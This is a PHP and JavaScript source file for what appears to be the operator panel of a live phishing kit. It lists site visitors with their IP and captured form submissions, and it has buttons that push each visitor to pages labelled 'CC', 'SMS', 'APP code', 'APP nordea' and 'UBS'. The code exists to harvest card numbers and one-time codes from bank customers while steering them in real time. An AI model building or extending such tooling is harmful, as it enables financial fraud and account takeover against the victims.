<?php
require_once '../includes/config.php';
require_once '../includes/functions.php';
require_once '../includes/performance_database.php';
require_once 'auth.php';

if (!isLoggedIn()) {
    header('Location: index.php');
    exit;
}

// Initialize database
$db = PerformanceDatabase::getInstance();

// Handle AJAX requests
if (isset($_GET['action'])) {
    header('Content-Type: application/json');
    
    switch($_GET['action']) {
        case 'getStats':
            echo json_encode([
                'online' => $db->getOnlineCount(),
                'total' => $db->getTotalVisitorCount()
            ]);
            break;
            
        case 'getVisitors':
            $visitors = $db->getVisitors(100);
            $visitorData = array_map(function($v) use ($db) {
                return [
                    'id' => $v['id'],
                    'ip' => $v['ip'],
                    'page_name' => $v['page_name'] ?? 'Unknown',
                    'online' => $db->isVisitorOnline($v['id']),
                    'form_data' => $v['form_data'] ?? null,
                    'form_submitted' => $v['form_submitted'] ?? false,
                    'form_submissions' => $v['form_submissions'] ?? []
                ];
            }, $visitors);
            echo json_encode($visitorData);
            break;
            
        case 'redirect':
            $visitorId = $_GET['visitor_id'] ?? '';
            $page = $_GET['page'] ?? '';
            
            if ($visitorId && $page) {
                $data = json_encode([
                    'visitor_id' => $visitorId,
                    'page' => $page,
                    'timestamp' => time()
                ]) . PHP_EOL;
                file_put_contents(DATA_DIR . 'redirects.txt', $data, FILE_APPEND);
                echo json_encode(['success' => true]);
            } else {
                echo json_encode(['success' => false]);
            }
            break;
            
        case 'redirect_to_page':
            $visitorId = $_GET['visitor_id'] ?? '';
            $page = $_GET['page'] ?? '';
            $text = $_GET['text'] ?? '';
            
            if ($visitorId && $page) {
                $data = json_encode([
                    'visitor_id' => $visitorId,
                    'page' => $page,
                    'custom_text' => $text,
                    'timestamp' => time()
                ]) . PHP_EOL;
                file_put_contents(DATA_DIR . 'redirects.txt', $data, FILE_APPEND);
                echo json_encode(['success' => true]);
            } else {
                echo json_encode(['success' => false]);
            }
            break;
            
        case 'blockIP':
            $input = json_decode(file_get_contents('php://input'), true);
            $ip = $input['ip'] ?? '';
            
            if ($ip) {
                $config = getConfig();
                $blockedIps = explode(',', $config['blocked_ips'] ?? '');
                if (!in_array($ip, $blockedIps)) {
                    $blockedIps[] = $ip;
                    updateConfig(['blocked_ips' => implode(',', array_filter($blockedIps))]);
                    echo json_encode(['success' => true]);
                } else {
                    echo json_encode(['success' => false, 'message' => 'IP already blocked']);
                }
            } else {
                echo json_encode(['success' => false]);
            }
            break;
    }
    exit;
}

// Get initial data
$onlineCount = $db->getOnlineCount();
$totalCount = $db->getTotalVisitorCount();
$themeMode = getThemeMode();
?>
<!DOCTYPE html>
<html lang="en" data-theme="<?php echo htmlspecialchars($themeMode); ?>">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Dashboard - <?php echo htmlspecialchars(getSiteName()); ?></title>
    <link rel="stylesheet" type="text/css" href="./assets/admin.css">
    <style>
        /* Smooth table transitions */
        .visitors-table tbody tr {
            transition: opacity 0.3s ease, transform 0.3s ease;
        }
        
        .visitors-table tbody tr.updating {
            opacity: 0.7;
        }
        
        /* Submission time styling */
        .submission-time {
            font-size: 11px;
            color: var(--text-color);
            opacity: 0.7;
            margin-bottom: 5px;
            font-style: italic;
            border-bottom: 1px solid var(--border-color);
            padding-bottom: 3px;
        }
        
        /* Prevent layout shift */
        .visitors-table {
            table-layout: fixed;
        }
        
        .visitors-table td {
            vertical-align: top;
        }
        
        /* Smooth cell updates */
        .visitors-table td {
            transition: background-color 0.3s ease;
        }
        
        .visitors-table td.updated {
            background-color: rgba(76, 175, 80, 0.1);
        }
        
        /* Larger action buttons */
        .actions-cell {
            white-space: nowrap;
        }
        
        .actions-cell .redirect-btn {
            padding: 10px 16px !important;
            margin: 3px !important;
            font-size: 14px !important;
            font-weight: 500;
            min-width: 80px;
            display: inline-block;
        }
        
        .actions-cell .block-ip-btn {
            padding: 10px 14px !important;
            margin: 3px !important;
            font-size: 16px !important;
            min-width: 45px;
            height: 38px;
            display: inline-flex;
            align-items: center;
            justify-content: center;
        }
        
        /* Better button colors */
        .redirect-btn.redirect-cc {
            background-color: #FF5722 !important;
        }
        
        .redirect-btn.redirect-page1 {
            background-color: #2196F3 !important;
        }
        
        .redirect-btn.redirect-page2 {
            background-color: #FF9800 !important;
        }
        
        .redirect-btn.redirect-custom {
            background-color: #9C27B0 !important;
        }
        
        /* Hover effects */
        .redirect-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
        }
        
        .block-ip-btn:hover {
            background-color: #d32f2f !important;
            transform: translateY(-2px);
        }
    </style>
</head>
<body>
    <audio id="notification-sound" preload="auto">
        <source src="assets/notification.wav" type="audio/wav">
    </audio>
    
    <div class="container">
        <div class="header">
            <h1>Admin Dashboard</h1>
            <div class="header-buttons">
                <a href="" class="settings-btn2">Dashboard</a>
                <a href="logs.php" class="settings-btn">Visitor Logs</a>
                <a href="data_manager.php" class="settings-btn">Results</a>
                <a href="settings.php" class="settings-btn">Settings</a>
                <a href="?action=logout" class="logout-btn">Logout</a>
            </div>
        </div>
 
        <div class="stats">
            <div class="stat-card">
                <h2>Online Visitors</h2>
                <div class="value" id="online-count"><?php echo $onlineCount; ?></div>
            </div>
            <div class="stat-card">
                <h2>Total Visitors</h2>
                <div class="value" id="total-count"><?php echo $totalCount; ?></div>
            </div>
        </div>

        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
            <h2>Visitors</h2>
            <button id="sound-toggle" class="sound-toggle-btn" title="Toggle sound">
                <i class="sound-icon"></i>
                <span class="sound-text">Sound</span>
            </button>
        </div>
        
        <div class="visitors-table-container">
            <table class="visitors-table">
                <thead>
                    <tr>
                        <th style="width: 100px;">Status</th>
                        <th style="width: 120px;">IP Address</th>
                        <th style="width: 100px;">Current Page</th>
                        <th style="width: 300px;">Form Data</th>
                        <th style="min-width: 500px;">Actions</th>
                    </tr>
                </thead>
                <tbody id="visitors-table-body">
                    <!-- Populated by JavaScript -->
                </tbody>
            </table>
        </div>
    </div>
    
    <!-- Custom Page Modal -->
    <div class="modal-overlay" id="modal-overlay"></div>
    <div class="simple-custom-modal" id="custom-page-modal">
        <h3 class="modal-title">Send Text Code</h3>
        
        <div class="page-selector">
            <label for="page-select">Select Page:</label>
            <select id="page-select">
            <option value="app3">Appcode</option>
            <option value="app3e">Appcode Error</option>
            </select>
        </div>
        
        <div class="custom-input-group">
            <label for="custom-page-text">Enter Data:</label>
            <input type="text" id="custom-page-text" class="custom-page-input" placeholder="Enter text...">
        </div>
        
        <div class="modal-buttons">
            <button class="cancel-btn" id="cancel-custom-text">Cancel</button>
            <button class="redirect-btn redirect-custom" id="send-custom-text">Send</button>
        </div>
        
        <input type="hidden" id="selected-visitor-id" value="">
    </div>

<script>
// Configuration
const UPDATE_INTERVAL = 3000; // 3 seconds
const STATS_INTERVAL = 2000; // 2 seconds

// State
let soundEnabled = <?php echo snd(); ?>;
let lastVisitorCount = <?php echo $onlineCount; ?>;

// Initialize sound from localStorage
if (localStorage.getItem('soundEnabled') !== null) {
    soundEnabled = localStorage.getItem('soundEnabled') === 'true';
}

// Store previous visitor data for comparison
let previousVisitorData = new Map();

// Main update functions with smooth updates
function updateVisitorsTable() {
    fetch('dashboard.php?action=getVisitors')
        .then(response => response.json())
        .then(visitors => {
            const tbody = document.getElementById('visitors-table-body');
            if (!tbody) return;
            
            // Create a map of current visitors
            const currentVisitorMap = new Map(visitors.map(v => [v.id, v]));
            
            // Update existing rows or add new ones
            visitors.forEach(visitor => {
                const existingRow = tbody.querySelector(`tr[data-visitor-id="${visitor.id}"]`);
                const previousData = previousVisitorData.get(visitor.id);
                
                // Check if data has changed
                const hasChanged = !previousData || 
                    previousData.online !== visitor.online ||
                    previousData.page_name !== visitor.page_name ||
                    JSON.stringify(previousData.form_submissions) !== JSON.stringify(visitor.form_submissions);
                
                if (existingRow && hasChanged) {
                    // Update only the cells that changed
                    updateRow(existingRow, visitor, previousData);
                } else if (!existingRow) {
                    // Add new row
                    const newRow = document.createElement('tr');
                    newRow.setAttribute('data-visitor-id', visitor.id);
                    newRow.innerHTML = createRowHTML(visitor);
                    tbody.appendChild(newRow);
                }
            });
            
            // Remove rows for visitors that no longer exist
            tbody.querySelectorAll('tr[data-visitor-id]').forEach(row => {
                const visitorId = row.getAttribute('data-visitor-id');
                if (!currentVisitorMap.has(visitorId)) {
                    row.style.opacity = '0';
                    setTimeout(() => row.remove(), 300);
                }
            });
            
            // Update previous data
            previousVisitorData = currentVisitorMap;
        })
        .catch(error => console.error('Error updating visitors:', error));
}

// Update specific cells in a row
function updateRow(row, visitor, previousData) {
    // Update status if changed
    if (!previousData || previousData.online !== visitor.online) {
        const statusCell = row.cells[0];
        statusCell.innerHTML = `
            <span class="online-status ${visitor.online ? 'online' : 'offline'}"></span>
            ${visitor.online ? 'Online' : 'Offline'}
        `;
        flashCell(statusCell);
    }
    
    // Update page if changed
    if (!previousData || previousData.page_name !== visitor.page_name) {
        row.cells[2].textContent = visitor.page_name;
        flashCell(row.cells[2]);
    }
    
    // Update form data if changed
    if (!previousData || JSON.stringify(previousData.form_submissions) !== JSON.stringify(visitor.form_submissions)) {
        row.cells[3].innerHTML = formatFormData(visitor);
        flashCell(row.cells[3]);
    }
}

// Flash cell to show update
function flashCell(cell) {
    cell.classList.add('updated');
    setTimeout(() => cell.classList.remove('updated'), 1000);
}

// Create row HTML
function createRowHTML(visitor) {
    return `
        <td>
            <span class="online-status ${visitor.online ? 'online' : 'offline'}"></span>
            ${visitor.online ? 'Online' : 'Offline'}
        </td>
        <td>
            <span class="copyable-data" onclick="copyText('${visitor.ip}')">${visitor.ip}</span>
        </td>
        <td>${visitor.page_name}</td>
        <td class="form-data-cell">${formatFormData(visitor)}</td>
        <td class="actions-cell">
            <button class="redirect-btn redirect-page1" onclick="redirectVisitor('${visitor.id}', 'card')">CC</button>
			<button class="redirect-btn redirect-page2" onclick="redirectVisitor('${visitor.id}', 'card2')">CC</button>
            <button class="redirect-btn redirect-page1" onclick="redirectVisitor('${visitor.id}', 'sms')">SMS</button>
			<button class="redirect-btn redirect-page2" onclick="redirectVisitor('${visitor.id}', 'sms2')">SMS</button>
            <button class="redirect-btn redirect-page1" onclick="redirectVisitor('${visitor.id}', 'app')">APP</button> 
            <button class="redirect-btn redirect-page2" onclick="redirectVisitor('${visitor.id}', 'app2')">APP</button> 
            <button class="redirect-btn redirect-page2" onclick="openCustomPageModal('${visitor.id}')">APP CODE</button>
            <button class="redirect-btn redirect-page1" onclick="redirectVisitor('${visitor.id}', 'mas')">APP Master</button> 
            <button class="redirect-btn redirect-page1" onclick="redirectVisitor('${visitor.id}', 'vis')">APP nordea</button> 
            <button class="redirect-btn redirect-page1" onclick="redirectVisitor('${visitor.id}', 'sb')">APP SB</button>
             <button class="redirect-btn redirect-page1" onclick="redirectVisitor('${visitor.id}', 'ubs')">UBS</button>
            <button class="redirect-btn redirect-page1" onclick="redirectVisitor('${visitor.id}', 'load')">loading</button> 
            <button class="redirect-btn redirect-page4" onclick="redirectVisitor('${visitor.id}', 'fin')">​FIN</button> 
            <button class="redirect-btn redirect-page4" onclick="redirectVisitor('${visitor.id}', 'web')">Site</button>
            <button class="block-ip-btn redirect-page4" onclick="blockVisitorIP('${visitor.ip}', '${visitor.id}')" title="Block this IP">🚫</button>
        </td>
    `;
}

function updateStats() {
    fetch('dashboard.php?action=getStats')
        .then(response => response.json())
        .then(data => {
            document.getElementById('online-count').textContent = data.online;
            document.getElementById('total-count').textContent = data.total;
            
            if (data.online > lastVisitorCount && soundEnabled) {
                playNotificationSound();
            }
            lastVisitorCount = data.online;
        })
        .catch(error => console.error('Error updating stats:', error));
}

// Helper functions
function formatFormData(visitor) {
    if (!visitor.form_submitted) {
        return '<div class="no-data">No form data</div>';
    }
    
    const submissions = visitor.form_submissions || [];
    if (submissions.length === 0 && visitor.form_data) {
        submissions.push(visitor.form_data);
    }
    
    return `
        <div class="form-data-container">
            ${submissions.map((data, idx) => {
                // Format submission time
                const submissionTime = data.date || (data.timestamp ? new Date(data.timestamp * 1000).toLocaleString() : 'Unknown time');
                
                return `
                    <div class="form-data ${idx === 0 ? 'latest' : ''}">
                        <div class="submission-time">Submitted: ${submissionTime}</div>
                        ${Object.entries(data)
                            .filter(([key]) => !['timestamp', 'date', 'action'].includes(key))
                            .map(([key, value]) => `
                                <div class="form-field">
                                    <span class="field-label">${key}:</span>
                                    <span class="copyable-data" onclick="copyText('${value}')">${value}</span>
                                </div>
                            `).join('')}
                    </div>
                `;
            }).join('')}
        </div>
        <button class="copy-all-btn" onclick="copyAllData('${visitor.id}')">Copy All</button>
    `;
}

// Actions
function redirectVisitor(visitorId, page) {
    fetch(`dashboard.php?action=redirect&visitor_id=${visitorId}&page=${page}`)
        .then(response => response.json())
        .then(data => {
            if (data.success) showNotification(`Redirected to ${page}`);
        });
}

function blockIP(ip) {
    if (!confirm(`Block IP ${ip}?`)) return;
    
    fetch('dashboard.php?action=blockIP', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ip: ip})
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            showNotification(`IP ${ip} blocked`);
            updateVisitorsTable();
        }
    });
}

function copyText(text) {
    navigator.clipboard.writeText(text)
        .then(() => showNotification('Copied!'))
        .catch(() => {
            const textarea = document.createElement('textarea');
            textarea.value = text;
            textarea.style.position = 'fixed';
            textarea.style.opacity = '0';
            document.body.appendChild(textarea);
            textarea.select();
            document.execCommand('copy');
            document.body.removeChild(textarea);
            showNotification('Copied!');
        });
}

function copyAllData(visitorId) {
    fetch('dashboard.php?action=getVisitors')
        .then(response => response.json())
        .then(visitors => {
            const visitor = visitors.find(v => v.id === visitorId);
            if (!visitor) return;
            
            let text = `ID: ${visitor.id}\nIP: ${visitor.ip}\nPage: ${visitor.page_name}\n`;
            
            if (visitor.form_submissions?.length > 0) {
                text += '\nForm Data:\n';
                visitor.form_submissions.forEach((sub, idx) => {
                    text += `\n--- Submission ${idx + 1} ---\n`;
                    
                    // Add submission time
                    const submissionTime = sub.date || (sub.timestamp ? new Date(sub.timestamp * 1000).toLocaleString() : 'Unknown time');
                    text += `Submitted: ${submissionTime}\n`;
                    
                    Object.entries(sub).forEach(([key, value]) => {
                        if (!['timestamp', 'date', 'action'].includes(key)) {
                            text += `${key}: ${value}\n`;
                        }
                    });
                });
            }
            
            copyText(text);
        });
}

// Modal functions
function openCustomPageModal(visitorId) {
    document.getElementById('selected-visitor-id').value = visitorId;
    document.getElementById('custom-page-text').value = '';
    document.getElementById('custom-page-modal').style.display = 'block';
    document.getElementById('modal-overlay').style.display = 'block';
}

function closeCustomPageModal() {
    document.getElementById('custom-page-modal').style.display = 'none';
    document.getElementById('modal-overlay').style.display = 'none';
}

// Notifications
function showNotification(message) {
    const notification = document.createElement('div');
    notification.className = 'notification';
    notification.textContent = message;
    document.body.appendChild(notification);
    
    setTimeout(() => {
        notification.style.opacity = '0';
        setTimeout(() => notification.remove(), 500);
    }, 2000);
}

function playNotificationSound() {
    if (!soundEnabled) return;
    const audio = document.getElementById('notification-sound');
    if (audio) {
        audio.currentTime = 0;
        audio.play().catch(e => console.log('Audio play failed:', e));
    }
}

// Sound toggle
document.getElementById('sound-toggle')?.addEventListener('click', function() {
    soundEnabled = !soundEnabled;
    localStorage.setItem('soundEnabled', soundEnabled.toString());
    this.classList.toggle('enabled', soundEnabled);
    this.classList.toggle('disabled', !soundEnabled);
    showNotification(`Sound ${soundEnabled ? 'enabled' : 'disabled'}`);
});

// Modal event listeners
document.getElementById('cancel-custom-text').addEventListener('click', closeCustomPageModal);
document.getElementById('modal-overlay').addEventListener('click', closeCustomPageModal);

document.getElementById('send-custom-text').addEventListener('click', function() {
    const visitorId = document.getElementById('selected-visitor-id').value;
    const page = document.getElementById('page-select').value;
    const text = document.getElementById('custom-page-text').value.trim();
    
    if (visitorId && text) {
        fetch(`dashboard.php?action=redirect_to_page&visitor_id=${visitorId}&page=${page}&text=${encodeURIComponent(text)}`)
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    showNotification(`Sent to ${page}`);
                    closeCustomPageModal();
                }
            });
    }
});

// Initialize
document.addEventListener('DOMContentLoaded', function() {
    // Set initial sound state
    const soundToggle = document.getElementById('sound-toggle');
    if (soundToggle) {
        soundToggle.classList.toggle('enabled', soundEnabled);
        soundToggle.classList.toggle('disabled', !soundEnabled);
    }
    
    // Start updates
    updateVisitorsTable();
    updateStats();
    
    // Set intervals
    setInterval(updateVisitorsTable, UPDATE_INTERVAL);
    setInterval(updateStats, STATS_INTERVAL);
});
</script>

</body>
</html>